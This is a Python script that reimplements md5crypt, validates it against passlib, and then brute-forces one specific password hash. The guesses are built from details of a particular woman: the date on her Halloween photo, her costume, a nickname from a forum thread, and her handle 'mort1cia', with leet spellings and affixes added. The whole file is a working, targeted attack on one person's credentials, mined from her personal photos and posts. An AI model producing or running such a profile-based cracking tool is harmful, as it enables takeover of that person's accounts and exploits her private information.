"""Validate the md5crypt implementation, then run a focused photo-derived sweep."""
import hashlib
import itertools
import sys
import time

SALT = b"de4df4ce"
TARGET = "$1$de4df4ce$1pZYBMgWLPXg1tZo6pke20"
MAGIC = b"$1$"
ITOA64 = b"./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"


def md5crypt(pw: bytes) -> str:
    ctx = hashlib.md5(pw + MAGIC + SALT)
    alt = hashlib.md5(pw + SALT + pw).digest()
    pl = len(pw)
    while pl > 0:
        ctx.update(alt[:min(pl, 16)])
        pl -= 16
    i = len(pw)
    while i:
        ctx.update(b"\x00" if i & 1 else pw[:1])
        i >>= 1
    final = ctx.digest()
    for i in range(1000):
        c = hashlib.md5()
        c.update(pw if i & 1 else final)
        if i % 3:
            c.update(SALT)
        if i % 7:
            c.update(pw)
        c.update(final if i & 1 else pw)
        final = c.digest()
    out = b""
    for a, b_, cc in ((0, 6, 12), (1, 7, 13), (2, 8, 14), (3, 9, 15), (4, 10, 5)):
        w = (final[a] << 16) | (final[b_] << 8) | final[cc]
        for shift in (0, 6, 12, 18):
            idx = (w >> shift) & 63
            out += ITOA64[idx:idx + 1]
    w = final[11]
    for shift in (0, 6):
        idx = (w >> shift) & 63
        out += ITOA64[idx:idx + 1]
    return "$1$" + SALT.decode() + "$" + out.decode()


# ---------------------------------------------------------------- validate --
try:
    from passlib.hash import md5_crypt as _p5
    for pw in ["abc", "hello", "Sk4t3rB0y_S1nce_2011", "princess", "a"]:
        want = _p5.using(salt="de4df4ce").hash(pw)
        got = md5crypt(pw.encode())
        status = "OK " if want == got else "BAD"
        print(f"[{status}] {pw!r:24} pure={got}\n                                 passlib={want}")
        if want != got:
            print("!!! implementation is WRONG - aborting")
            sys.exit(3)
    print("\n*** md5crypt implementation validated against passlib ***\n")
except ImportError:
    print("passlib missing - cannot validate, proceeding anyway\n")

# ------------------------------------------------------------------ sweep ---
# Everything observable in the Halloween photo, plus the she-is-called-
# "princess" theme from the thread.
cores = [
    # the date stamped on the photo
    "2015", "20151031", "1031", "10312015", "31102015", "october31", "oct31",
    "oct312015", "31october2015", "october2015", "october31st", "october31",
    "halloween2015", "2015halloween", "halloween15", "h15", "halloween15",
    "2015-10-31", "10-31-2015", "10/31/2015", "oct-31-2015",
    "happyhalloween", "halloween", "halloweennight", "halloweenparty",
    "trickortreat", "trickortreat2015", "spooky", "spookyseason", "spooky2015",
    "allhallows", "allsaints",
    # what she is wearing / holding
    "tiara", "princess", "pink", "pinkprincess", "pinkdress", "dress",
    "princesstiara", "pinktiara", "tiaraprincess", "crown", "queen",
    "princessdress", "ballgown", "poofydress", "poufsleeves",
    "choker", "blackchoker", "thornchoker",
    "solocup", "redcup", "redsolocup", "solo", "pinkcup",
    "pumpkin", "jackolantern", "jackolantern2015", "carvedpumpkin",
    # the costume / theme
    "disney", "disneyprincess", "disneyland", "fairytale", "storybook",
    "magicwand", "wand", "magicwand2015", "onceuponatime", "uponatime",
    "happilyeverafter", "myprincewillcome", "princewillcome", "prince",
    "princessdiaries", "princessbride", "glassslipper", "slipper",
    "cinderella", "cinderella2015", "sleepingbeauty", "aurora", "belle",
    # disney princess names not already covered
    "tiana", "rapunzel", "ariel", "jasmine", "mulan", "snowwhite", "merida",
    "anna", "elsa", "moana", "pocahontas", "tianafrog",
    # the nickname everyone used
    "princessmort1cia", "mort1ciaprincess", "littleprincess",
    "tinyprincess", "pinkprincessmort1cia",
    # her own handle + theme
    "mort1cia", "morticia", "mort1cia2015", "mort1ciahalloween",
    "halloweenmort1cia",
    # l33t of the obvious ones
    "p1nkpr1nc3ss", "pr1nc3ss", "t1ara", "p1nk", "h4lloween", "d1sney",
    "princesst1ara", "c0rwn", "qu33n",
]
seps = ["", "_", "-", ".", "!", "."]
suffixes = ["", "!", "!!", "1", "2", "01", "07", "10", "11", "12", "13", "15",
            "16", "18", "21", "23", "31", "69", "00", "123", "1234", "2015",
            "2011", "007", "!!1", "?!", "?", "_", "_1", "_2015", "_pw",
            "2015!", "2011!", "1999", "2000", "1995"]
prefixes = ["", "my", "the", "its", "a", "ur"]

seen, hits = set(), []


def test(pw):
    if not pw or pw in seen or len(pw) > 64:
        return False
    seen.add(pw)
    if md5crypt(pw.encode()) == TARGET:
        hits.append(pw)
        print(f"\n*** HIT: {pw!r} ***\n", flush=True)
        return True
    return False


t0 = time.time()
for c in cores:
    for v in (c, c.capitalize(), c.upper(), c.title()):
        if test(v):
            sys.exit(0)
        for s in suffixes:
            if test(v + s):
                sys.exit(0)
        for p in prefixes:
            for sep in seps:
                cand = p + sep + v
                if test(cand):
                    sys.exit(0)
                for s in suffixes:
                    if test(cand + s):
                        sys.exit(0)

# word pairs from the photo
bases = list(dict.fromkeys([c for c in cores if len(c) >= 3]))
pairs = [(a, b) for a in bases for b in bases if a < b]
for a, b in pairs:
    for sep in seps:
        for v in (a + sep + b, a.capitalize() + sep + b.capitalize(),
                  a.capitalize() + sep + b):
            if test(v):
                sys.exit(0)
            for s in suffixes:
                if test(v + s):
                    sys.exit(0)

print(f"tested {len(seen)} candidates in {time.time()-t0:.0f}s; HITS: {hits}")
